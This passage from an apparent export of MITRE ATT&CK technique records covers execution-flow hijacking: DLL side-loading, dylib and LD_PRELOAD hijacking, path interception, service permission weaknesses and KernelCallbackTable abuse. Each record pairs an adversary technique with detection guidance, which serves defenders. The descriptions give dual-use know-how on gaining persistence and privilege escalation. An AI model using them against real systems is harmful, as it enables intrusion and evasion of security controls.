bypassed":null,"contributors":"Stefan Kanthak; Travis Smith, Tripwire","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Mandiant APT1 Appendix),(Citation: ESET Sednit Part 3),(Citation: FireEye Hikit Rootkit),(Citation: Proofpoint TA416 Europe March 2022),(Citation: NCC Group WastedLocker June 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: ESET InvisiMole June 2018),(Citation: FireEye FIN7 Oct 2019),(Citation: ZScaler Hacking Team),(Citation: ESET Operation Groundbait),(Citation: PowerSploit Documentation),(Citation: ESET Exchange Mar 2021),(Citation: Github PowerShell Empire),(Citation: GitHub PowerSploit May 2012),(Citation: FinFisher Citation),(Citation: MSTIC FoggyWeb September 2021),(Citation: Securelist BlackOasis Oct 2017),(Citation: Eset Ramsay May 2020),(Citation: Symantec Whitefly March 2019),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: ESET EvilNum July 2020),(Citation: ESET Crutch December 2020),(Citation: Nccgroup Emissary Panda May 2018),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: FireEye APT10 April 2017),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Group IB RTM August 2019),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: CrowdStrike AQUATIC PANDA December 2021),(Citation: APT15 Intezer June 2018),(Citation: PWC Cloud Hopper April 2017),(Citation: Microsoft Sxstrace),(Citation: Microsoft More information about DLL),(Citation: Powersploit),(Citation: Microsoft Dynamic Link Library Search Order)"}
{"ID":"T1574.002","name":"Hijack Execution Flow: DLL Side-Loading","description":"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.(Citation: FireEye DLL Side-Loading)","url":"https://attack.mitre.org/techniques/T1574/002","created":"13 March 2020","last modified":"30 March 2023","version":"2.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the introduction of new files/programs. Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":"Anti-virus, Application Control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Arbor Musical Chairs Feb 2018),(Citation: Palo Alto Networks BBSRAT),(Citation: TrendMicro EarthLusca 2022),(Citation: SecureWorks BRONZE UNION June 2017),(Citation: Securelist LuckyMouse June 2018),(Citation: NCC Group Chimera January 2021),(Citation: Securelist APT10 March 2021),(Citation: Medium Metamorfo Apr 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: FireEye Clandestine Fox Part 2),(Citation: Trend Micro DRBControl February 2020),(Citation: Microsoft Wingbird Nov 2017),(Citation: Cybereason Oceanlotus May 2017),(Citation: PTSecurity Higaisa 2020),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Dell Sakula),(Citation: Symantec Cicada November 2020),(Citation: Palo Alto PlugX June 2017),(Citation: PaloAlto Patchwork Mar 2018),(Citation: Recorded Future REDDELTA July 2020),(Citation: FireEye Metamorfo Apr 2018),(Citation: TrendMicro Patchwork Dec 2017),(Citation: CitizenLab KeyBoy Nov 2016),(Citation: Cyble Egregor Oct 2020),(Citation: Palo Alto T9000 Feb 2016),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: CYBERCOM Iranian Intel Cyber January 2022),(Citation: Forcepoint Monsoon),(Citation: ESET Twitter Ida Pro Nov 2021),(Citation: FireEye Clandestine Fox),(Citation: DHS CISA AA22-055A MuddyWater February 2022),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Anomali MUSTANG PANDA October 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: Unit 42 KerrDown February 2019),(Citation: Trend Micro Waterbear December 2019),(Citation: Dell TG-3390),(Citation: Bitdefender Naikon April 2021),(Citation: Deep Instinct Black Basta August 2022),(Citation: Trend Micro Tick November 2019),(Citation: Kaspersky LuminousMoth July 2021),(Citation: Proofpoint TA416 November 2020),(Citation: Bitdefender LuminousMoth July 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: Anomali Pirate Panda April 2020),(Citation: Stewart 2014),(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: FinFisher Citation),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Lunghi Iron Tiger Linux),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: FireEye APT10 Sept 2018),(Citation: ESET OceanLotus Mar 2019),(Citation: Unit 42 C0d0so0 Jan 2016),(Citation: Microsoft FinFisher March 2018),(Citation: Microsoft SIR Vol 21),(Citation: Cybereason Soft Cell June 2019),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: ESET Casbaneiro Oct 2019),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: Profero APT27 December 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint TA459 April 2017),(Citation: CheckPoint Naikon May 2020),(Citation: Cybereason Cobalt Kitty 2017),(Citation: FireEye DLL Side-Loading)"}
{"ID":"T1574.004","name":"Hijack Execution Flow: Dylib Hijacking","description":"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with <code>@rpath</code>, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the <code>LC_LOAD_WEAK_DYLIB</code> function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Wardle Dylib Hijacking OSX 2015)(Citation: Github EmpireProject HijackScanner)(Citation: Github EmpireProject CreateHijacker Dylib) Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.(Citation: Writing Bad Malware for OSX)(Citation: wardle artofmalware volume1)(Citation: MalwareUnicorn macOS Dylib Injection MachO)","url":"https://attack.mitre.org/techniques/T1574/004","created":"16 March 2020","last modified":"30 March 2023","version":"2.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\nRun path dependent libraries can include <code>LC_LOAD_DYLIB</code>, <code>LC_LOAD_WEAK_DYLIB</code>, and <code>LC_RPATH</code>. Other special keywords are recognized by the macOS loader are <code>@rpath</code>, <code>@loader_path</code>, and <code>@executable_path</code>.(Citation: Apple Developer Doco Archive Run-Path) These loader instructions can be examined for individual binaries or frameworks using the <code>otool -l</code> command. Objective-See's Dylib Hijacking Scanner can be used to identify applications vulnerable to dylib hijacking.(Citation: Wardle Dylib Hijack Vulnerable Apps)(Citation: Github EmpireProject HijackScanner)","platforms":"macOS","data sources":"File: File Creation, File: File Modification, Module: Module Load","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":"Application Control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Github PowerShell Empire),"}
{"ID":"T1574.006","name":"Hijack Execution Flow: Dynamic Linker Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)\n\nOn Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python’s <code>os.environ</code>.\n\nOn Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) \n\nOn macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) ","url":"https://attack.mitre.org/techniques/T1574/006","created":"13 March 2020","last modified":"30 March 2023","version":"2.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor for changes to environment variables and files associated with loading shared libraries such as <code>LD_PRELOAD</code> and <code>DYLD_INSERT_LIBRARIES</code>, as well as the commands to implement these changes.\n\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Intezer HiddenWasp Map 2019),(Citation: Unit 42 Hildegard Malware),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: Anomali Rocke March 2019),(Citation: ESET Ebury Oct 2017),(Citation: trendmicro xcsset xcode project 2020),(Citation: Apple Developer Doco Hardened Runtime)"}
{"ID":"T1574.005","name":"Hijack Execution Flow: Executable Installer File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002). Several examples of this weakness in existing common installers have been reported to software vendors.(Citation: mozilla_sec_adv_2012)  (Citation: Executable Installers are Vulnerable) If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","url":"https://attack.mitre.org/techniques/T1574/005","created":"13 March 2020","last modified":"26 March 2020","version":"1.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Module: Module Load, Process: Process Creation, Service: Service Metadata","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":"Stefan Kanthak; Travis Smith, Tripwire","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, SYSTEM, User","relationship citations":",(Citation: Executable Installers are Vulnerable),(Citation: Powersploit)"}
{"ID":"T1574.013","name":"Hijack Execution Flow: KernelCallbackTable","description":"Adversaries may abuse the <code>KernelCallbackTable</code> of a process to hijack its execution flow in order to run their own payloads.(Citation: Lazarus APT January 2022)(Citation: FinFisher exposed ) The <code>KernelCallbackTable</code> can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once <code>user32.dll</code> is loaded.(Citation: Windows Process Injection KernelCallbackTable)\n\nAn adversary may hijack the execution flow of a process using the <code>KernelCallbackTable</code> by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) or [Process Injection](https://attack.mitre.org/techniques/T1055) into another process.\n\nA pointer to the memory address of the <code>KernelCallbackTable</code> can be obtained by locating the PEB (ex: via a call to the <code>NtQueryInformationProcess()</code> [Native API](https://attack.mitre.org/techniques/T1106) function).(Citation: NtQueryInformationProcess) Once the pointer is located, the <code>KernelCallbackTable</code> can be duplicated, and a function in the table (e.g., <code>fnCOPYDATA</code>) set to the address of a malicious payload (ex: via <code>WriteProcessMemory()</code>). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.(Citation: Lazarus APT January 2022)\n\nThe tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the <code>KernelCallbackTable</code> may also be restored to its original state by the rest of the malicious payload.(Citation: Lazarus APT January 2022) Use of the <code>KernelCallbackTable</code> to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.","url":"https://attack.mitre.org/techniques/T1574/013","created":"25 February 2022","last modified":"22 March 2022","version":"1.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious behaviors that could relate to post-compromise behavior.\n\nMonitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>WriteProcessMemory()</code> and <code>NtQueryInformationProcess()</code> with the parameter set to <code>ProcessBasicInformation</code> may be used for this technique.(Citation: Lazarus APT January 2022)","platforms":"Windows","data sources":"Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FinFisher exposed ),(Citation: Qualys LolZarus),(Citation: Lazarus APT January 2022),"}
{"ID":"T1574.007","name":"Hijack Execution Flow: Path Interception by PATH Environment Variable","description":"Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called from a script or the command line.\n\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if <code>C:\\example path</code> precedes </code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.","url":"https://attack.mitre.org/techniques/T1574/007","created":"13 March 2020","last modified":"30 March 2023","version":"1.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Windows","data sources":"File: File Creation, Process: Process Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":"Application Control","contributors":"Stefan Kanthak","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub PowerSploit May 2012),(Citation: Github PowerShell Empire),(Citation: PowerSploit Documentation),(Citation: Windows Commands JPCERT),(Citation: NSA MS AppLocker),(Citation: Microsoft Application Lockdown),(Citation: Microsoft Using Software Restriction ),(Citation: Microsoft CreateProcess),(Citation: Microsoft Windows Defender Application Control),(Citation: SANS Application Whitelisting),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Vulnerability and Exploit Detector)"}
{"ID":"T1574.008","name":"Hijack Execution Flow: Path Interception by Search Order Hijacking","description":"Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.\n\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), the search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Windows NT Command Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.\n\nFor example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: Microsoft Environment Property)\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001).","url":"https://attack.mitre.org/techniques/T1574/008","created":"13 March 2020","last modified":"30 March 2023","version":"1.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":"Stefan Kanthak","permissions required":"Administrator, SYSTEM, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, SYSTEM, User","relationship citations":"(Citation: GitHub PowerSploit May 2012),(Citation: Github PowerShell Empire),(Citation: PowerSploit Documentation),(Citation: Windows Commands JPCERT),(Citation: NSA MS AppLocker),(Citation: Microsoft Application Lockdown),(Citation: Microsoft Using Software Restriction ),(Citation: Microsoft CreateProcess),(Citation: Microsoft Windows Defender Application Control),(Citation: SANS Application Whitelisting),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Vulnerability and Exploit Detector)"}
{"ID":"T1574.009","name":"Hijack Execution Flow: Path Interception by Unquoted Path","description":"Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.\n\nService paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)\n\nThis technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.","url":"https://attack.mitre.org/techniques/T1574/009","created":"13 March 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Monitor the executing process for process executable paths that are named for partial directories. Monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.\n\nData and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":"Stefan Kanthak","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: GitHub PowerSploit May 2012),(Citation: Github PowerShell Empire),(Citation: PowerSploit Documentation),(Citation: Windows Commands JPCERT),(Citation: NSA MS AppLocker),(Citation: Microsoft Application Lockdown),(Citation: Microsoft Using Software Restriction ),(Citation: Microsoft CreateProcess),(Citation: Microsoft Windows Defender Application Control),(Citation: SANS Application Whitelisting),(Citation: Microsoft Dynamic-Link Library Security),(Citation: Vulnerability and Exploit Detector)"}
{"ID":"T1574.010","name":"Hijack Execution Flow: Services File Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.","url":"https://attack.mitre.org/techniques/T1574/010","created":"12 March 2020","last modified":"30 March 2023","version":"1.0","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.\n\nLook for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques. ","platforms":"Windows","data sources":"File: File Creation, File: File Modification, Process: Process Creation, Service: Service Metadata","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":null,"contributors":"Stefan Kanthak; Travis Smith, Tripwire","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"Administrator, SYSTEM, User","relationship citations":"(Citation: F-Secure BlackEnergy 2014),(Citation: Executable Installers are Vulnerable),(Citation: Powersploit)"}
{"ID":"T1574.011","name":"Hijack Execution Flow: Services Registry Permissions Weakness","description":"Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)","url":"https://attack.mitre.org/techniques/T1574/011","created":"13 March 2020","last modified":"30 March 2023","version":"1.1","tactics":"Defense Evasion, Persistence, Privilege Escalation","detection":"Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information. (Citation: Autoruns for Windows) Look for changes to services that do not correlate with known software, patch cycles, etc. Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\nMonitor processes and command-line arguments for actions that could be done to modify services. Remote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Services may also be changed through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001), so additional logging may need to be configured to gather the appropriate data.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Service: Service Modification, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1574","defenses bypassed":"Application Control","contributors":"Matthew Demaske, Adaptforward; Travis Smith, Tripwire","permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"SYSTEM","relationship citations":"(Citation: McAfee Honeybee),"}
{"ID":"T1562","name":"Impair Defenses","description":"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.\n\nAdversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out of a computer or stopping it from being shut down. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Emotet shutdown)\n\nAdversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.","url":"https://attack.mitre.org/techniques/T1562","created":"21 February 2020","last modified":"15 April 2023","version":"1.4","tactics":"Defense Evasion","detection":"Monitor processes and command-line arguments to see if security tools or logging services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools.  Lack of log events may be suspicious.\n\nMonitor environment variables and APIs that can be leveraged to disable security measures.","platforms":"Containers, IaaS, Linux, Network, Office 365, Windows, macOS","data sources":"Cloud Service: Cloud Service Disable, Cloud Service: Cloud Service Modification, Command: Command Execution, Driver: Driver Load, Firewall: Firewall Disable, Firewall: Firewall Rule Modification, Process: Process Creation, Process: Process Termination, Script: Script Execution, Sensor Health: Host Status, Service: Service Metadata, User Account: User Account Modification, Windows Registry: Windows Registry Key Deletion, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses 